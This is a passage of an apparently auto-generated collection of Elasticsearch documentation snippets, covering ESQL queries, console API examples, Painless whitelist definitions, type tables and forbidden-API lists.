}

GET my-index-000001/_search
{
  "query": {
    "bool": {
      "must": [
        { "match": { "id": "foo" }},
        { "match": { "zone": 10 }}
      ]
    }
  }
}

GET my-index-000001/_search
{
  "query": {
    "bool": {
      "must": [
        { "match": { "attributes.id": "foo" }},
        { "match": { "attributes.zone": 10 }}
      ]
    }
  }
}

----------------------------------------

TITLE: Describing TO_CARTESIAN_POINT Function in Elasticsearch ESQL
DESCRIPTION: This snippet provides a description of the TO_CARTESIAN_POINT function in Elasticsearch ESQL. It explains that the function converts input values to cartesian_point format, with specific handling for string inputs that must conform to the WKT Point format.

LANGUAGE: markdown
CODE:
**Description**

Converts an input value to a `cartesian_point` value. A string will only be successfully converted if it respects the [WKT Point](https://en.wikipedia.org/wiki/Well-known_text_representation_of_geometry) format.

----------------------------------------

TITLE: Elasticsearch ESQL Function Description
DESCRIPTION: This snippet describes the functionality of the ESQL function being tested. It states that the function sorts a multivalued field in lexicographical order.

LANGUAGE: plaintext
CODE:
**Description**

Sorts a multivalued field in lexicographical order.

----------------------------------------

TITLE: Analyzing Text with Keyword Analyzer in Elasticsearch
DESCRIPTION: Example of using the keyword analyzer to process a text string. This demonstrates how the analyzer returns the entire input as a single token without any tokenization.

LANGUAGE: console
CODE:
POST _analyze
{
  "analyzer": "keyword",
  "text": "The 2 QUICK Brown-Foxes jumped over the lazy dog's bone."
}

----------------------------------------

TITLE: Date Histogram Aggregation Example
DESCRIPTION: Example showing how to use date histogram as a value source with calendar interval and formatting.

LANGUAGE: console
CODE:
GET /_search
{
  "size": 0,
  "aggs": {
    "my_buckets": {
      "composite": {
        "sources": [
          { "date": { "date_histogram": { "field": "timestamp", "calendar_interval": "1d", "format": "yyyy-MM-dd" } } }
        ]
      }
    }
  }
}

----------------------------------------

TITLE: Sample Output of SecurityManager Scanner Tool
DESCRIPTION: Examples of the CSV output generated by the SecurityManager scanner tool. Each line represents an entry point where a security check is performed, with tab-separated columns providing detailed information about the check.

LANGUAGE: plaintext
CODE:
java.base	sun/nio/ch/DatagramChannelImpl.java	1360	sun/nio/ch/DatagramChannelImpl	connect (Ljava/net/SocketAddress;Z)Ljava/nio/channels/DatagramChannel;	PRIVATE	checkConnect

LANGUAGE: plaintext
CODE:
java.base	java/net/ResponseCache.java	118	java/net/ResponseCache	setDefault	(Ljava/net/ResponseCache;)V	PUBLIC	setResponseCache	java/net/NetPermission

----------------------------------------

TITLE: Slicing Multi-Value Fields with Positive Indices in ESQL
DESCRIPTION: This example demonstrates how to use mv_slice function with positive indices to extract portions of a multi-value field. It shows extracting a single element and a range of elements.

LANGUAGE: esql
CODE:
row a = [1, 2, 2, 3]
| eval a1 = mv_slice(a, 1), a2 = mv_slice(a, 2, 3)

----------------------------------------

TITLE: Setting GCE Project ID in gcloud CLI
DESCRIPTION: Command to set the default GCE project ID in local gcloud configuration to avoid repeating it in subsequent commands.

LANGUAGE: sh
CODE:
gcloud config set project es-cloud

----------------------------------------

TITLE: Conditional Type Mapping Table in Markdown
DESCRIPTION: Defines a matrix of supported data type combinations for conditional operations, showing how different input types are handled and what output types are produced. The table covers primitive types like boolean, numeric types, date types, and complex types like geo_point and shapes.

LANGUAGE: markdown
CODE:
| condition | trueValue | elseValue | result |
| --- | --- | --- | --- |
| boolean | boolean | boolean | boolean |
| boolean | boolean | | boolean |
| boolean | cartesian_point | cartesian_point | cartesian_point |
| boolean | cartesian_point | | cartesian_point |
| boolean | cartesian_shape | cartesian_shape | cartesian_shape |
| boolean | cartesian_shape | | cartesian_shape |
| boolean | date | date | date |
| boolean | date | | date |
| boolean | date_nanos | date_nanos | date_nanos |
| boolean | date_nanos | | date_nanos |
| boolean | double | double | double |
| boolean | double | | double |
| boolean | geo_point | geo_point | geo_point |
| boolean | geo_point | | geo_point |
| boolean | geo_shape | geo_shape | geo_shape |
| boolean | geo_shape | | geo_shape |
| boolean | integer | integer | integer |
| boolean | integer | | integer |
| boolean | ip | ip | ip |
| boolean | ip | | ip |
| boolean | keyword | keyword | keyword |
| boolean | keyword | text | keyword |
| boolean | keyword | | keyword |
| boolean | long | long | long |
| boolean | long | | long |
| boolean | text | keyword | keyword |
| boolean | text | text | keyword |
| boolean | text | | keyword |
| boolean | unsigned_long | unsigned_long | unsigned_long |
| boolean | unsigned_long | | unsigned_long |
| boolean | version | version | version |
| boolean | version | | version |

----------------------------------------

TITLE: Using Environment.getFileStore() for File Store Operations
DESCRIPTION: Recommends using org.elasticsearch.env.Environment.getFileStore() instead of java.nio.file.Files#getFileStore(java.nio.file.Path) due to JDK-8034057 impact.

LANGUAGE: java
CODE:
java.nio.file.Files#getFileStore(java.nio.file.Path) @ Use org.elasticsearch.env.Environment.getFileStore() instead, impacted by JDK-8034057

----------------------------------------

TITLE: Defining String Augmentations for Reindex Scripts in Java
DESCRIPTION: Specifies allowed String augmentation methods for generating SHA hashes in reindex scripts.

LANGUAGE: java
CODE:
class java.lang.String {
  String org.elasticsearch.painless.api.Augmentation sha1()
  String org.elasticsearch.painless.api.Augmentation sha256()
  String org.elasticsearch.painless.api.Augmentation sha512()
}

----------------------------------------

TITLE: Defining Supported Types for String Pattern Matching in ESQL
DESCRIPTION: This markdown table defines the supported types for string pattern matching in ESQL. It shows that both keyword and text types can be matched against keyword patterns, resulting in a boolean output.

LANGUAGE: markdown
CODE:
| str | pattern | result |
| --- | --- | --- |
| keyword | keyword | boolean |
| text | keyword | boolean |

----------------------------------------

TITLE: Querying Documents by Data Tier in Elasticsearch
DESCRIPTION: Example demonstrating how to query documents across multiple indexes based on their data tier preferences using the _tier field. The example shows indexing documents into two different indexes and then performing a terms query to match documents from specific tiers (data_hot and data_warm).

LANGUAGE: console
CODE:
PUT index_1/_doc/1
{
  "text": "Document in index 1"
}

PUT index_2/_doc/2?refresh=true
{
  "text": "Document in index 2"
}

GET index_1,index_2/_search
{
  "query": {
    "terms": {
      "_tier": ["data_hot", "data_warm"]
    }
  }
}

----------------------------------------

TITLE: Calculating Arctangent using ATAN Function in ESQL
DESCRIPTION: This snippet demonstrates the usage of the ATAN function in ESQL. It creates a row with a numeric value and applies the ATAN function to calculate its arctangent. The result shows both the input value and the computed arctangent.

LANGUAGE: esql
CODE:
ROW a=12.9
| EVAL atan=ATAN(a)

----------------------------------------

TITLE: Computing Hourly Error Rates with CASE in ESQL
DESCRIPTION: Calculates hourly error rates from log data by using CASE to identify error messages, grouping by hour using DATE_TRUNC, and computing average error rate per hour.

LANGUAGE: esql
CODE:
FROM sample_data
| EVAL error = CASE(message LIKE "*error*", 1, 0)
| EVAL hour = DATE_TRUNC(1 hour, @timestamp)
| STATS error_rate = AVG(error) by hour
| SORT hour

----------------------------------------

TITLE: Creating Index Mapping with Join Field
DESCRIPTION: Creates an index with a join field mapping that establishes a parent-child relationship between questions and answers.

LANGUAGE: console
CODE:
PUT child_example
{
  "mappings": {
    "properties": {
      "join": {
        "type": "join",
        "relations": {
          "question": "answer"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Installing Elasticsearch Plugin with Self-Signed Certificate
DESCRIPTION: Command to install an Elasticsearch plugin from an HTTPS URL using a self-signed certificate by specifying a custom Java truststore.

LANGUAGE: shell
CODE:
sudo CLI_JAVA_OPTS="-Djavax.net.ssl.trustStore=/path/to/trustStore.jks" bin/elasticsearch-plugin install https://host/plugin.zip

----------------------------------------

TITLE: Calculating Absolute Value of a Negative Number in ESQL
DESCRIPTION: This snippet demonstrates how to use the ABS function to calculate the absolute value of a negative number. It creates a row with a negative number and applies the ABS function to it.

LANGUAGE: esql
CODE:
ROW number = -1.0
| EVAL abs_number = ABS(number)

----------------------------------------

TITLE: Deprecating Hasher#values() in Elasticsearch Java Security Module
DESCRIPTION: This code snippet indicates that the 'values()' method in the Hasher class should not be used due to potential inclusion of unwanted algorithms. It recommends using 'getAvailableAlgoStoredHash()' and 'getAvailableAlgoCacheHash()' methods instead for retrieving available hashing algorithms.

LANGUAGE: Java
CODE:
org.elasticsearch.xpack.core.security.authc.support.Hasher#values()

----------------------------------------

TITLE: Default Date Format Configuration for date_nanos
DESCRIPTION: Shows the default date format used by the date_nanos field type when no custom format is specified.

LANGUAGE: js
CODE:
"strict_date_optional_time_nanos||epoch_millis"

----------------------------------------

TITLE: Defining InternalEqlScriptUtils Class for EQL Scripting in Java
DESCRIPTION: This class provides additional utility methods specific to EQL scripting, including multi-value document handling and various string manipulation functions. It complements the InternalQlScriptUtils class in the EQL scripting whitelist.

LANGUAGE: java
CODE:
class org.elasticsearch.xpack.eql.expression.function.scalar.whitelist.InternalEqlScriptUtils {

  Boolean multiValueDocValues(java.util.Map, String, java.util.function.Predicate)

  String  between(String, String, String, Boolean, Boolean)
  Boolean cidrMatch(String, java.util.List)
  String  concat(java.util.List)
  Boolean endsWith(String, String, Boolean)
  Integer indexOf(String, String, Number, Boolean)
  Integer length(String)
  Number  number(String, Number)
  String  string(Object)
  Boolean stringContains(String, String, Boolean)
  String  substring(String, Number, Number)

  Boolean seq(Object, Object)
  Boolean sneq(Object, Object)
}

----------------------------------------

TITLE: Including External Markdown File in RST
DESCRIPTION: A Sphinx include directive that imports the contents of cast.md from the layout directory into the current document.

LANGUAGE: restructuredtext
CODE:
:::{include} layout/cast.md
:::

----------------------------------------

TITLE: Querying a Document with copy_to Field in Elasticsearch
DESCRIPTION: This snippet demonstrates how to query the full_name field, which contains the copied values from first_name and last_name fields.

LANGUAGE: console
CODE:
GET my-index-000001/_search
{
  "query": {
    "match": {
      "full_name": {
        "query": "John Smith",
        "operator": "and"
      }
    }
  }
}

----------------------------------------

TITLE: Defining Modulus Operator in Markdown
DESCRIPTION: This snippet defines the modulus operator using Markdown syntax. It includes a header, an image reference, and a description of the operator's functionality.

LANGUAGE: markdown
CODE:
## Modulus `%` [esql-mod]

:::{image} ../../../images/operators/mod.svg
:alt: Embedded
:class: text-center
:::

Divide one number by another and return the remainder. If either field is [multivalued](/reference/query-languages/esql/esql-multivalued-fields.md) then the result is `null`.



:::{include} ../types/mod.md
:::

----------------------------------------

TITLE: Calculating Median Absolute Deviation Formula in Elasticsearch
DESCRIPTION: Mathematical explanation of how median absolute deviation is calculated for a random variable X. The formula is defined as median(|median(X) - X|). For even number of values, medians are calculated as the average of middle two values with non-floating point numbers rounded towards 0.

LANGUAGE: markdown
CODE:
median(|median(X) - X|)

----------------------------------------

TITLE: Configuring Custom Analyzer with Synonym Graph Filter in Elasticsearch
DESCRIPTION: JSON configuration for a custom analyzer that includes a synonym_graph filter. This example shows how to incorporate the synonym filter into an analysis chain.

LANGUAGE: json
CODE:
{
  "analyzer": {
    "my_analyzer": {
      "type": "custom",
      "tokenizer": "standard",
      "filter": ["stemmer", "synonym_graph"]
    }
  }
}

----------------------------------------

TITLE: Defining Compatible Timezone Names for Elasticsearch
DESCRIPTION: This snippet lists timezone names that are available in both PostgreSQL and Java, ensuring compatibility across different systems. It includes a variety of global timezones, covering major cities and regions.

LANGUAGE: plaintext
CODE:
# The following timezone names are a subset of the timezones names
# that are both available in PostgeSQL `SELECT name FROM pg_timezone_names`
# and in Java `java.time.ZoneId.getAvailableZoneIds()`
US/Samoa
Pacific/Honolulu
Pacific/Marquesas
Pacific/Gambier
America/Juneau
Canada/Yukon
America/Vancouver
Pacific/Easter
US/Mountain
America/Chicago
US/Michigan
Atlantic/Bermuda
Canada/Newfoundland
Atlantic/Cape_Verde
Pacific/Kiritimati
Pacific/Chatham
Pacific/Auckland
Asia/Sakhalin
Australia/Tasmania
Australia/North
Asia/Tokyo
Australia/Eucla
Asia/Singapore
Asia/Rangoon
Indian/Chagos
Asia/Calcutta
Asia/Tashkent
Asia/Tehran
Asia/Dubai
Africa/Nairobi
Europe/Brussels
Europe/Vienna
Europe/London
Etc/GMT+12

----------------------------------------

TITLE: Running Elasticsearch with Entitlements
DESCRIPTION: Command to enable the entitlements system when running Elasticsearch locally. By default, the entitlements system is disabled and the agent is not loaded.

LANGUAGE: shell
CODE:
./gradlew run --entitlements

----------------------------------------

TITLE: ESQL ABS Function Comment Header
DESCRIPTION: Comment header indicating this is an auto-generated file for the ABS function documentation.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Restricting Apache HTTP Entity Constructors in Java
DESCRIPTION: This code snippet defines restrictions on various Apache HTTP entity constructors. It specifies that certain constructors should explicitly set the ContentType, while others are deprecated and should be avoided. Some entity types are also flagged as prone to misuse.

LANGUAGE: java
CODE:
@defaultMessage Explicitly specify the ContentType of HTTP entities when creating
org.apache.http.entity.StringEntity#<init>(java.lang.String)
org.apache.http.entity.StringEntity#<init>(java.lang.String,java.lang.String)
org.apache.http.entity.StringEntity#<init>(java.lang.String,java.nio.charset.Charset)
org.apache.http.entity.ByteArrayEntity#<init>(byte[])
org.apache.http.entity.ByteArrayEntity#<init>(byte[],int,int)
org.apache.http.entity.FileEntity#<init>(java.io.File)
org.apache.http.entity.InputStreamEntity#<init>(java.io.InputStream)
org.apache.http.entity.InputStreamEntity#<init>(java.io.InputStream,long)
org.apache.http.nio.entity.NByteArrayEntity#<init>(byte[])
org.apache.http.nio.entity.NByteArrayEntity#<init>(byte[],int,int)
org.apache.http.nio.entity.NFileEntity#<init>(java.io.File)
org.apache.http.nio.entity.NStringEntity#<init>(java.lang.String)
org.apache.http.nio.entity.NStringEntity#<init>(java.lang.String,java.lang.String)

@defaultMessage Use non-deprecated constructors
org.apache.http.nio.entity.NFileEntity#<init>(java.io.File,java.lang.String)
org.apache.http.nio.entity.NFileEntity#<init>(java.io.File,java.lang.String,boolean)
org.apache.http.entity.FileEntity#<init>(java.io.File,java.lang.String)
org.apache.http.entity.StringEntity#<init>(java.lang.String,java.lang.String,java.lang.String)

@defaultMessage BasicEntity is easy to mess up and forget to set content type
org.apache.http.entity.BasicHttpEntity#<init>()

@defaultMessage EntityTemplate is easy to mess up and forget to set content type
org.apache.http.entity.EntityTemplate#<init>(org.apache.http.entity.ContentProducer)

@defaultMessage SerializableEntity uses java serialization and makes it easy to forget to set content type
org.apache.http.entity.SerializableEntity#<init>(java.io.Serializable)

----------------------------------------

TITLE: Basic PERCENTILE Function Usage in ESQL
DESCRIPTION: Demonstrates calculating multiple percentiles (0th, 50th, and 99th) of employee salaries using the PERCENTILE function. Returns the results as three separate columns with double precision values.

LANGUAGE: esql
CODE:
FROM employees
| STATS p0 = PERCENTILE(salary,  0)
     , p50 = PERCENTILE(salary, 50)
     , p99 = PERCENTILE(salary, 99)

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice Template
DESCRIPTION: Template text for applying the Apache License 2.0 to a project. The template includes placeholders for copyright year and owner information that should be replaced when implementing.

LANGUAGE: text
CODE:
Copyright {yyyy} {name of copyright owner}

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

----------------------------------------

TITLE: ESQL Mathematical Functions List
DESCRIPTION: Markdown list of links to mathematical function documentation in ESQL, including common mathematical operations, trigonometric functions, and mathematical constants.

LANGUAGE: markdown
CODE:
* [`ABS`](../../esql-functions-operators.md#esql-abs)
* [`ACOS`](../../esql-functions-operators.md#esql-acos)
* [`ASIN`](../../esql-functions-operators.md#esql-asin)
* [`ATAN`](../../esql-functions-operators.md#esql-atan)
* [`ATAN2`](../../esql-functions-operators.md#esql-atan2)
* [`CBRT`](../../esql-functions-operators.md#esql-cbrt)
* [`CEIL`](../../esql-functions-operators.md#esql-ceil)
* [`COS`](../../esql-functions-operators.md#esql-cos)
* [`COSH`](../../esql-functions-operators.md#esql-cosh)
* [`E`](../../esql-functions-operators.md#esql-e)
* [`EXP`](../../esql-functions-operators.md#esql-exp)
* [`FLOOR`](../../esql-functions-operators.md#esql-floor)
* [`HYPOT`](../../esql-functions-operators.md#esql-hypot)
* [`LOG`](../../esql-functions-operators.md#esql-log)
* [`LOG10`](../../esql-functions-operators.md#esql-log10)
* [`PI`](../../esql-functions-operators.md#esql-pi)
* [`POW`](../../esql-functions-operators.md#esql-pow)
* [`ROUND`](../../esql-functions-operators.md#esql-round)
* [`SIGNUM`](../../esql-functions-operators.md#esql-signum)
* [`SIN`](../../esql-functions-operators.md#esql-sin)
* [`SINH`](../../esql-functions-operators.md#esql-sinh)
* [`SQRT`](../../esql-functions-operators.md#esql-sqrt)
* [`TAN`](../../esql-functions-operators.md#esql-tan)
* [`TANH`](../../esql-functions-operators.md#esql-tanh)
* [`TAU`](../../esql-functions-operators.md#esql-tau)

----------------------------------------

TITLE: Declaring BooleanFieldScript Classes for Painless in Elasticsearch
DESCRIPTION: Declares the BooleanFieldScript and BooleanFieldScript$Factory classes without importing them, allowing Painless to find these classes for boolean-valued runtime fields.

LANGUAGE: Java
CODE:
class org.elasticsearch.script.BooleanFieldScript @no_import {
}
class org.elasticsearch.script.BooleanFieldScript$Factory @no_import {
}

----------------------------------------

TITLE: Including Type Information in Markdown
DESCRIPTION: This snippet includes a separate Markdown file containing information about data types related to the 'less than' operator using a special syntax.

LANGUAGE: markdown
CODE:
:::{include} ../types/less_than.md
:::

----------------------------------------

TITLE: Including LOG10 Function Documentation Sections in Markdown
DESCRIPTION: This snippet shows the structure of the documentation, including various sections of the LOG10 function documentation using markdown include statements.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `LOG10` [esql-log10]

**Syntax**

:::{image} ../../../images/functions/log10.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/log10.md
:::

:::{include} ../description/log10.md
:::

:::{include} ../types/log10.md
:::

:::{include} ../examples/log10.md
:::

----------------------------------------

TITLE: ST_Intersects Function Description
DESCRIPTION: Defines the ST_Intersects geometric function that checks if two geometries intersect by having any points in common, including interior points. This is mathematically expressed as ST_Intersects(A, B) ⇔ A ⋂ B ≠ ∅ and is the inverse of ST_DISJOINT.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Description**

Returns true if two geometries intersect. They intersect if they have any point in common, including their interior points (points along lines or within polygons). This is the inverse of the [ST_DISJOINT](/reference/query-languages/esql/esql-functions-operators.md#esql-st_disjoint) function. In mathematical terms: ST_Intersects(A, B) ⇔ A ⋂ B ≠ ∅

----------------------------------------

TITLE: Implementing REST API Compatibility in Java for Request Deserialization
DESCRIPTION: Example of using ParseField to declare version-aware parsers for different API versions.

LANGUAGE: java
CODE:
PARSER.declareInt(MyPojo::setMax, new ParseField("maximum", "limit").forRestApiVersion(RestApiVersion.equalTo(RestApiVersion.V_7)));
PARSER.declareInt(MyPojo::setMax, new ParseField("maximum").forRestApiVersion(RestApiVersion.onOrAfter(RestApiVersion.V_8)));

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text to be included when applying the Apache License 2.0 to software projects. Requires replacing bracketed fields with actual copyright information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Supported PIVOT Query with Explicit Value List
DESCRIPTION: Shows a supported PIVOT query where the values to pivot are explicitly listed.

LANGUAGE: sql
CODE:
SELECT * FROM test_emp PIVOT (SUM(salary) FOR languages IN (1, 2))

----------------------------------------

TITLE: Defining ChronoField Enum in Java for Painless
DESCRIPTION: Defines the ChronoField enum, which represents fields of date-time objects like year, month, day, hour, etc. It includes methods for value validation and conversion.

LANGUAGE: java
CODE:
class java.time.temporal.ChronoField {
  ChronoField ALIGNED_DAY_OF_WEEK_IN_MONTH
  ChronoField ALIGNED_DAY_OF_WEEK_IN_YEAR
  ChronoField ALIGNED_WEEK_OF_MONTH
  ChronoField ALIGNED_WEEK_OF_YEAR
  ChronoField AMPM_OF_DAY
  ChronoField CLOCK_HOUR_OF_AMPM
  ChronoField CLOCK_HOUR_OF_DAY
  ChronoField DAY_OF_MONTH
  ChronoField DAY_OF_WEEK
  ChronoField DAY_OF_YEAR
  ChronoField EPOCH_DAY
  ChronoField ERA
  ChronoField HOUR_OF_AMPM
  ChronoField HOUR_OF_DAY
  ChronoField INSTANT_SECONDS
  ChronoField MICRO_OF_DAY
  ChronoField MICRO_OF_SECOND
  ChronoField MILLI_OF_DAY
  ChronoField MILLI_OF_SECOND
  ChronoField MINUTE_OF_DAY
  ChronoField MINUTE_OF_HOUR
  ChronoField MONTH_OF_YEAR
  ChronoField NANO_OF_DAY
  ChronoField NANO_OF_SECOND
  ChronoField OFFSET_SECONDS
  ChronoField PROLEPTIC_MONTH
  ChronoField SECOND_OF_DAY
  ChronoField SECOND_OF_MINUTE
  ChronoField YEAR
  ChronoField YEAR_OF_ERA
  int checkValidIntValue(long)
  long checkValidValue(long)
  ChronoField valueOf(String)
  ChronoField[] values()
}

----------------------------------------

TITLE: Documenting Type Support in Markdown
DESCRIPTION: A markdown table defining the type mapping where string input types 'keyword' and 'text' produce integer results.

LANGUAGE: markdown
CODE:
| string | result |
| --- | --- |
| keyword | integer |
| text | integer |

----------------------------------------

TITLE: Displaying Supported Numeric Types for ESQL Function in Markdown
DESCRIPTION: This markdown snippet shows a table of supported numeric types and their corresponding result types for an ESQL function in Elasticsearch. It includes double, integer, long, and unsigned_long types.

LANGUAGE: markdown
CODE:
| number | result |
| --- | --- |
| double | double |
| integer | integer |
| long | long |
| unsigned_long | unsigned_long |

----------------------------------------

TITLE: Configuring Nori Number Token Filter in Elasticsearch
DESCRIPTION: Example showing how to configure an analyzer with nori_number token filter. The setup includes a tokenizer with discard_punctuation set to false and a part_of_speech filter to handle special characters correctly.

LANGUAGE: console
CODE:
PUT nori_sample
{
  "settings": {
    "index": {
      "analysis": {
        "analyzer": {
          "my_analyzer": {
            "tokenizer": "tokenizer_discard_puncuation_false",
            "filter": [
              "part_of_speech_stop_sp", "nori_number"
            ]
          }
        },
        "tokenizer": {
          "tokenizer_discard_puncuation_false": {
            "type": "nori_tokenizer",
            "discard_punctuation": "false"
          }
        },
        "filter": {
            "part_of_speech_stop_sp": {
                "type": "nori_part_of_speech",
                "stoptags": ["SP"]
            }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Including TO_UPPER Function Description in Markdown
DESCRIPTION: This snippet includes the content of a markdown file containing the description for the TO_UPPER function.

LANGUAGE: markdown
CODE:
:::{include} ../description/to_upper.md
:::

----------------------------------------

TITLE: Defining UnsignedLongDocValuesField Class in Java
DESCRIPTION: Dynamic class definition for handling unsigned long document field values. Provides methods for getting values with default fallbacks, accessing values by index, and converting to BigInteger representations.

LANGUAGE: java
CODE:
class org.elasticsearch.xpack.unsignedlong.UnsignedLongDocValuesField @dynamic_type {
  long get(long)
  long get(int, long)
  long getValue(long)
  long getValue(int, long)
  List getValues()
  BigInteger asBigInteger(BigInteger)
  BigInteger asBigInteger(int, BigInteger)
  List asBigIntegers()
}

----------------------------------------

TITLE: Conditional Counting with WHERE Clause in ESQL
DESCRIPTION: This example shows how to use COUNT with a WHERE clause to count only rows that meet a specific condition.

LANGUAGE: esql
CODE:
ROW n=1
| WHERE n < 0
| STATS COUNT(n)

----------------------------------------

TITLE: Embedding ESQL Documentation with AsciiDoc
DESCRIPTION: Example of how to embed CSV-SPEC test snippets into AsciiDoc documentation using include directives and tagged regions.

LANGUAGE: asciidoc
CODE:
[source.merge.styled,esql]
----
include::{esql-specs}/floats.csv-spec[tag=sin]
----
[%header.monospaced.styled,format=dsv,separator=|]
|===
include::{esql-specs}/floats.csv-spec[tag=sin-result]
|===

----------------------------------------

TITLE: ESQL Text Field Type Conversion Example
DESCRIPTION: Example showing how text fields are converted to keyword type when used in functions.

LANGUAGE: esql
CODE:
| FROM index
| EVAL greatest = GREATEST(field1, field2, field3)

----------------------------------------

TITLE: Defining FloatBuffer Class in Java NIO
DESCRIPTION: Defines the FloatBuffer class with a method to get a float at a specific index. Some methods are commented out as TODOs.

LANGUAGE: Java
CODE:
class java.nio.FloatBuffer {
  float get(int)
  # TODO: https:#github.com/elastic/elasticsearch/issues/79867
  # FloatBuffer get(int, float[])
  # FloatBuffer get(int, float[], int, int)
}

----------------------------------------

TITLE: Defining Supported Types for ESQL Function Test in Markdown
DESCRIPTION: This snippet defines a markdown table that lists the supported input and output types for an ESQL function test. It shows that both 'keyword' and 'text' input types are supported, with 'integer' as the result type for both.

LANGUAGE: markdown
CODE:
| string | result |
| --- | --- |
| keyword | integer |
| text | integer |

----------------------------------------

TITLE: Displaying Supported Types Table in Markdown
DESCRIPTION: This snippet presents a markdown table showing the supported types for an ESQL function. It includes columns for 'first' parameter type, 'rest' parameter types, and the resulting output type.

LANGUAGE: markdown
CODE:
| first | rest | result |
| --- | --- | --- |
| boolean | boolean | boolean |
| boolean | | boolean |
| date | date | date |
| date_nanos | date_nanos | date_nanos |
| double | double | double |
| integer | integer | integer |
| integer | | integer |
| ip | ip | ip |
| keyword | keyword | keyword |
| keyword | | keyword |
| long | long | long |
| long | | long |
| text | text | keyword |
| text | | keyword |
| version | version | version |

----------------------------------------

TITLE: Including TO_UPPER Function Parameters in Markdown
DESCRIPTION: This snippet includes the content of a markdown file containing the parameters for the TO_UPPER function.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/to_upper.md
:::

----------------------------------------

TITLE: Including TO_UPPER Function Types in Markdown
DESCRIPTION: This snippet includes the content of a markdown file containing the types information for the TO_UPPER function.

LANGUAGE: markdown
CODE:
:::{include} ../types/to_upper.md
:::

----------------------------------------

TITLE: Initializing Native Vector Library in ESVectorUtilTests
DESCRIPTION: Logs the initialization of the native vector library for ESVectorUtilTests, similar to VectorScorerFactoryTests.

LANGUAGE: text
CODE:
[2024-12-23T09:52:40,837][INFO ][o.e.n.j.JdkVectorLibrary ] [[SUITE-ESVectorUtilTests-seed#[7B469FBE8B6D0C65]]] vec_caps=1
[2024-12-23T09:52:40,840][INFO ][o.e.n.NativeAccess       ] [[SUITE-ESVectorUtilTests-seed#[7B469FBE8B6D0C65]]] Using native vector library; to disable start with -Dorg.elasticsearch.nativeaccess.enableVectorLibrary=false

----------------------------------------

TITLE: Defining Time Format Enums in Painless
DESCRIPTION: Defines enums related to date-time formatting, including FormatStyle, ResolverStyle, SignStyle, and TextStyle.

LANGUAGE: java
CODE:
class java.time.format.FormatStyle {
  FormatStyle FULL
  FormatStyle LONG
  FormatStyle MEDIUM
  FormatStyle SHORT
  FormatStyle valueOf(String)
  FormatStyle[] values()
}

class java.time.format.ResolverStyle {
  ResolverStyle LENIENT
  ResolverStyle SMART
  ResolverStyle STRICT
  ResolverStyle valueOf(String)
  ResolverStyle[] values()
}

class java.time.format.SignStyle {
  SignStyle ALWAYS
  SignStyle EXCEEDS_PAD
  SignStyle NEVER
  SignStyle NORMAL
  SignStyle NOT_NEGATIVE
  SignStyle valueOf(String)
  SignStyle[] values()
}

class java.time.format.TextStyle {
  TextStyle FULL
  TextStyle FULL_STANDALONE
  TextStyle NARROW
  TextStyle NARROW_STANDALONE
  TextStyle SHORT
  TextStyle SHORT_STANDALONE
  TextStyle asNormal()
  TextStyle asStandalone()
  boolean isStandalone()
  TextStyle valueOf(String)
  TextStyle[] values()
}

----------------------------------------

TITLE: Documenting Supported Types for ESQL Function in Markdown
DESCRIPTION: A markdown table that outlines the supported input and result types for different algorithms in an ESQL function. It shows how keyword and text types are handled for both input and result.

LANGUAGE: markdown
CODE:
| algorithm | input | result |
| --- | --- | --- |
| keyword | keyword | keyword |
| keyword | text | keyword |
| text | keyword | keyword |
| text | text | keyword |

----------------------------------------

TITLE: Displaying ESQL Function Type Mappings in Markdown
DESCRIPTION: A markdown table showing the mapping of string types to their corresponding result types for ESQL functions. It specifically shows how 'keyword' and 'text' string types are mapped.

LANGUAGE: markdown
CODE:
| string | result |
| --- | --- |
| keyword | keyword |
| text | keyword |

----------------------------------------

TITLE: Analyzing Text with Word Delimiter Graph Filter
DESCRIPTION: Example of using the analyze API with word_delimiter_graph filter to split and normalize tokens.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "keyword",
  "filter": [ "word_delimiter_graph" ],
  "text": "Neil's-Super-Duper-XL500--42+AutoCoder"
}

----------------------------------------

TITLE: ESQL Match Function Documentation Sections
DESCRIPTION: Includes references to separate markdown files containing detailed information about the MATCH function's parameters, description, types, named parameters, and examples.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/match.md
:::

:::{include} ../description/match.md
:::

:::{include} ../types/match.md
:::

:::{include} ../functionNamedParams/match.md
:::

:::{include} ../examples/match.md
:::

----------------------------------------

TITLE: Input Document for Community ID Processor
DESCRIPTION: Example input document containing network flow data that the Community ID processor will operate on. It includes source and destination IP addresses and ports, as well as the network transport protocol.

LANGUAGE: json
CODE:
{
  "_source": {
    "source": {
      "ip": "123.124.125.126",
      "port": 12345
    },
    "destination": {
      "ip": "55.56.57.58",
      "port": 80
    },
    "network": {
      "transport": "TCP"
    }
  }
}

----------------------------------------

TITLE: Stream Collector Interface Definition
DESCRIPTION: Interface definition for stream collection operations including accumulator, combiner and finisher methods.

LANGUAGE: java
CODE:
class java.util.stream.Collector {
  BiConsumer accumulator()
  Set characteristics()
  BinaryOperator combiner()
  Function finisher()
